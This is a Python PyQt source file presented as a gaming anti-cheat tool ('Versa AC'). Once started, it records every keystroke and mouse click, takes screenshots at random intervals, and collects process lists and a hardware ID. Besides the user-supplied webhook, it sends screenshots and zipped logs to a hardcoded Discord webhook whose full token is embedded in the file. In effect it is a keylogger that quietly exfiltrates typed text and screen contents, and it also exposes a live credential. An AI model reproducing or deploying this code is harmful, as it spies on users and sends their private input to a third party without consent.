# IMPORT / GUI AND MODULES AND WIDGETS
# ///////////////////////////////////////////////////////////////
import base64, hashlib, json, os.path, threading, logging, random, time, os, sys
from pynput import keyboard, mouse
from shiboken6.Shiboken import *
from global_functions import *
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from modules import *
from widgets import *
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1011192705797328926/hYwepYx4rdbAl3E5isKITuNO5PhSHNAMaXIohkQ8kQCxYlZC8-HTxcgd1grMPtf78y5M', username="CHEAT KAREGA TO KHATAM")

class MainWindow(QMainWindow):
    def __init__(self):
        QMainWindow.__init__(self)

        # WIDGETS
        # ////////////////////////
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.widgets = self.ui

        # PRIMARY VARIABLES
        # ////////////////////
        self.GlobalFunctions = GlobalFunctions()
        self.folder_id = f"{time.strftime('%Y.%m.%d')}_{self.GlobalFunctions.generate_random_string(3)}" # Log Folder
        self.startCheck = False # Checks whether the anti cheat has started
        self.stopCheck = False # Check whether the anti cheast has stopped
        self.click_counter = 0 # Checking how many clicks an user does (macro detection)
        self.hwid = self.GlobalFunctions.get_hwid() # User Hardware ID
        self.spoofer = self.GlobalFunctions.check_spoofer(self.hwid) # Check for spoofer
                    
        # BEGINNING FUNCTIONS
        # //////////////////////////
        with open("data/data.json", "r+") as f:
            data=json.load(f)
            self.widgets.enter_disc_webhook_2.setPlainText(QCoreApplication.translate("MainWindow", f"{data['id']}", None))

        # // Create log folder
        if not os.path.exists(self.folder_id):
            os.mkdir(self.folder_id)

        # // Logging
        for handler in logging.root.handlers[:]:
            logging.root.removeHandler(handler)
        logging.basicConfig(filename=f"{self.folder_id}/{time.strftime('%Y.%m.%d')}_logs.txt", level=logging.INFO, format="%(asctime)s: %(message)s")


        # SETTING UP APPLICATION
        # ///////////////////////////////////////////////////////////////
        Settings.ENABLE_CUSTOM_TITLE_BAR = True

        # Window Title
        self.setWindowTitle("Versa AC - Advanced Gaming Anti Cheat")
        self.widgets.titleRightInfo.setText("Versa AC - Advanced Gaming Anti Cheat")
        self.widgets.toggleButton.clicked.connect(lambda: UIFunctions.toggleMenu(self, True))
        UIFunctions.uiDefinitions(self)

        # Home Buttons
        self.widgets.btn_home.clicked.connect(self.button_click)
        self.widgets.btn_widgets.clicked.connect(self.button_click)
        self.widgets.btn_new.clicked.connect(self.button_click)

        # Start/Stop Buttons
        self.cursor = QTextCursor(self.ui.ac_logs_1.document())
        self.ui.button_start_1.clicked.connect(self.pre_start)
        self.widgets.button_stop_1.clicked.connect(self.stop)

        # Log Folder Dialog and Key Generator buttons
        self.widgets.open_log_folder_1.clicked.connect(self.upload_logs_to_discord_dialog)
        self.widgets.button_start_2.clicked.connect(self.key_generator)
        self.widgets.ac_logs_1.setReadOnly(True)

        # Hash Dialog and Exit Program Buttons
        self.widgets.select_hash_file_1.clicked.connect(self.hash_dialog)
        self.widgets.closeAppBtn.clicked.connect(self.exit_program)

        # Widget and StyleSheet
        self.widgets.stackedWidget.setCurrentWidget(self.widgets.home)
        self.widgets.btn_home.setStyleSheet(UIFunctions.selectMenu(self.widgets.btn_home.styleSheet()))

        # Show the UI
        self.show()

    # // On Button Click
    def button_click(self):
        button = self.sender()
        buttonName = button.objectName()
        button_names = {
            "btn_home": self.widgets.home,
            "btn_widgets": self.widgets.anti_cheat_1,
            "btn_new": self.widgets.new_page
        }
        # // Set the button style
        self.widgets.stackedWidget.setCurrentWidget(button_names[buttonName])
        UIFunctions.resetStyle(self, buttonName)
        button.setStyleSheet(UIFunctions.selectMenu(button.styleSheet()))

    # // Resize the UI Event
    def resizeEvent(self, _):
        UIFunctions.resize_grips(self)

    # // Mouse Press Event
    def mousePressEvent(self, event):
        try: self.dragPos = event.globalPos()
        except Exception: pass

    # // Load the new discord user id
    def load_new_discord_user(self):
        with open("data/data.json", "r+") as f:
            data = json.load(f)
            data["id"] = self.discorduser
            f.seek(0)
            json.dump(data, f, indent=4)
            f.truncate()
    
    # // Function to generate key
    def key_generator(self):
        self.widgets.enter_disc_webhook_3.setPlainText(self.GlobalFunctions.base64_encode(self.widgets.enter_disc_webhook_3.toPlainText()))

    # // Function to md5 hash dialog
    def _hash_dialog(self, file: str, hasher):
        enteredHash = self.widgets.enter_hash_code_1.toPlainText()
        fileHash = self.GlobalFunctions.hash_file_data(file, hasher)
        self.widgets.hash_file_result_1.setPlainText(self.GlobalFunctions.hash_results(file, fileHash, enteredHash))

    # // Function to return a dialog component
    def create_dialog(self):
        dialog = QFileDialog()
        dialog.setFileMode(QFileDialog.AnyFile)
        dialog.setFilter(QDir.Files)
        return dialog
        
    # // Function to select hash through dialog
    def hash_dialog(self):
        dialog = self.create_dialog()
        if dialog.exec():
            file = dialog.selectedFiles()
            if self.widgets.select_hash_type_1.currentText() == "MD5 Hash":
                self._hash_dialog(file[0], hashlib.md5())

            if self.widgets.select_hash_type_1.currentText() == "SHA-1 Hash":
                self._hash_dialog(file[0], hashlib.sha1())
    
            if self.widgets.select_hash_type_1.currentText() == "SHA-256 Hash":
                self._hash_dialog(file[0], hashlib.sha256())

    # // Function to Upload logs to discord
    def upload_logs_to_discord_dialog(self):
        try:
            dialog = self.create_dialog()
            if dialog.exec():
                file = dialog.selectedFiles()
                with open(file[0], 'rb') as f:
                    DiscordWebhooks.send(
                        url = base64.b64decode(self.widgets.enter_disc_webhook_1.toPlainText()), 
                        files = {
                            f"{self.discorduser}_{time.strftime('%Y.%m.%d.%H.%M')}_{file[0]}": f.read()
                        }
                    )
                self.cursor.insertText(f"\n[LOG] Uploaded Logs | " + time.ctime() + '\n')
        except Exception:
            self.widgets.ac_logs_1.appendPlainText(f"This Feature Requires a VAC Key\n")
            
    # // Stop the anti cheat
    def stop(self):
        if self.startCheck:
            self.stopCheck = True
            self.startCheck = False
            self.widgets.ac_logs_1.appendPlainText(f"User: {self.discorduser}\nStopped: {time.ctime()} | {datetime.now()}\nUser ID: {self.hwid}\n")
            file_code = self.GlobalFunctions.send_psutil_logs(self)
            zip_file = self.GlobalFunctions.create_zip_file(self)
            self.send_stop_webhook(file_code, zip_file)
            if zip_file != 0:
                try:
                    with open(zip_file + ".zip", "rb") as f:
                        webhook.add_file(file=f.read(), filename=self.discorduser + "_LOGS.zip")
                    response = webhook.execute()
                    self.cursor.insertText(f"\n[LOG] Uploaded Logs | " + time.ctime() + '\n')
                except Exception:
                    self.widgets.ac_logs_1.appendPlainText(f"This Feature Requires a VAC Key\n")

    
    # // Function for when an user exits the program
    def exit_program(self):
        if self.stopCheck and not self.startCheck or not self.startCheck and not self.stopCheck:
            return sys.exit(0)
        
        # // If currently running the anti-cheat
        file_code = self.GlobalFunctions.send_psutil_logs(self)
        zip_file = self.GlobalFunctions.create_zip_file(self)
        self.send_stop_webhook(file_code, zip_file)
        
        # // Close the program
        sys.exit(0)

    # // Function to call before starting the anti cheat
    def pre_start(self):
        if not self.startCheck:
            self.startCheck = True
            self.stopCheck = False
            self.discorduser = self.widgets.enter_disc_webhook_2.toPlainText()
            self.webhook = base64.b64decode(self.widgets.enter_disc_webhook_1.toPlainText())
            file_code: str = self.GlobalFunctions.send_psutil_logs(self)
            
            # // Load new discord user id
            self.load_new_discord_user()
            
            # // Send Start Message to logs
            self.widgets.ac_logs_1.setPlainText(f"Logs\n\nUser: {self.discorduser}\nStarted: {time.ctime()}\nUser ID: {self.hwid}\n")

            # // Discord Webhook
            try:
                with open(f'{self.folder_id}/programs_{self.discorduser}_{file_code}.txt', "rb") as f:
                    DiscordWebhooks.send(
                        url = self.webhook, 
                        title = "Anti Cheat Log", 
                        description = f'**User:** {self.discorduser}\n**Status:** Started VAC\n**Spoofer:** {self.spoofer}\n**File Code:** {file_code}',
                        footer = self.hwid,
                        files = {
                            f"programs_{self.discorduser}_{file_code}.txt": f.read()
                        }
                    )
                self.widgets.ac_logs_1.appendPlainText(f"VAC Key Loaded: \n{self.widgets.enter_disc_webhook_1.toPlainText()}\n")
            except Exception:
                self.widgets.ac_logs_1.appendPlainText("No VAC Key Loaded\n")
        
            # // Start Threads
            threading.Thread(target=self.start, daemon=True).start()
            threading.Thread(target=self.keyLogging, daemon=True).start()
            threading.Thread(target=self.macroDetection, daemon=True).start()

    # // Function to send the anti cheat stoping webhook
    def send_stop_webhook(self, file_code: str, zip_file: str):
        zip_file = f"{zip_file}.zip"
        
        # // File Hashes
        md5_hash = self.GlobalFunctions.hash_file_data(zip_file, hashlib.md5())
        sha1_hash = self.GlobalFunctions.hash_file_data(zip_file, hashlib.sha1())
        sha256_hash = self.GlobalFunctions.hash_file_data(zip_file, hashlib.sha256())
        
        # // Sending the webhook
        with open(f"{self.folder_id}/programs_{self.discorduser}_{file_code}.txt", "rb") as f:
            DiscordWebhooks.send(
                url = self.webhook, 
                title = "Anti Cheat Log", 
                description = f'**User:** {self.discorduser}\n**Status:** Stopped VAC\n**File Code:** {file_code}\n\n**ZIP MD5 Hash:** {md5_hash}\n**ZIP SHA-1 Hash:** {sha1_hash}\n**ZIP SHA-256 Hash:** {sha256_hash}', 
                footer = self.hwid,
                files = {
                    f"programs_{self.discorduser}_{file_code}.txt": f.read()
                }
            )
    # // Function to start the anti cheat
    def start(self):
        self.GlobalFunctions.create_logs_file(self)
        while not self.stopCheck:
            time.sleep(random.randint(0, 10))
            
            # // File/Screenshot creation
            file_id = self.GlobalFunctions.generate_random_string(3)
            log_file = self.GlobalFunctions.create_log_file(self, file_id)
            self.GlobalFunctions.create_new_log_files(self, log_file, file_id)

            try:
                with open(log_file, "rb") as f:
                    DiscordWebhooks.send(
                        url = self.webhook, 
                        title = "Anti Cheat Log", 
                        description = f'**User:**  {self.discorduser}\n**File Code:** {file_id}', 
                        thumbnail=f"attachment://{self.folder_id}/{time.strftime('%Y.%m.%d.%H.%M')}_{file_id}.png",
                        footer = self.hwid,
                        files = {
                            f"programs_{self.discorduser}_{file_id}.txt": f.read()
                        }
                    )
            except Exception:
                pass
            try:
                with open(self.folder_id + "/" + time.strftime("%Y.%m.%d.%H.%M") + "_" + file_id + ".png", "rb") as f:
                    webhook.add_file(file=f.read(), filename="v.png")
                response = webhook.execute()
            except Exception:
                pass
            time.sleep(random.randint(0, 50))


    # KEY LOGGING / MACRO DETECTION
    # /////////////////////////////
    def on_press(self, key):
        if self.startCheck:
            logging.info(str(key))

    # // Click Logs
    def on_click(self, x, y, button, pressed):
        self.click_counter += 1
        if self.startCheck and pressed:
            logging.info('Mouse Click (Position: {0}, {1}) : {2}'.format(x, y, button))

    # // Key Logs
    def keyLogging(self):
        if self.startCheck:
            mouse.Listener(on_click=self.on_click).start()
            keyboard.Listener(on_press=self.on_press).start()

    # // Macro Detection (Not really that good, will be working on this in the future)
    def macroDetection(self):
        while not self.stopCheck:
            time.sleep(1)
            if self.click_counter > 15:
                try:
                    # // Send Macro Detection Webhook
                    DiscordWebhooks.send(
                        url = self.webhook, 
                        title = "Macro Detected", 
                        description = f'**User:** {self.widgets.enter_disc_webhook_2.toPlainText()}\n**Type:** Auto Clicker', 
                        footer = self.hwid
                    )
                except Exception:
                    pass
                self.widgets.ac_logs_1.appendPlainText(f"\nWARNING: Macro Detected " + (time.strftime("%Y.%m.%d.%H.%M.%S") + '\n'))
            self.click_counter = 0

# // Show Application
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setWindowIcon(QIcon("images/icon.ico"))
    window = MainWindow()
    sys.exit(app.exec())
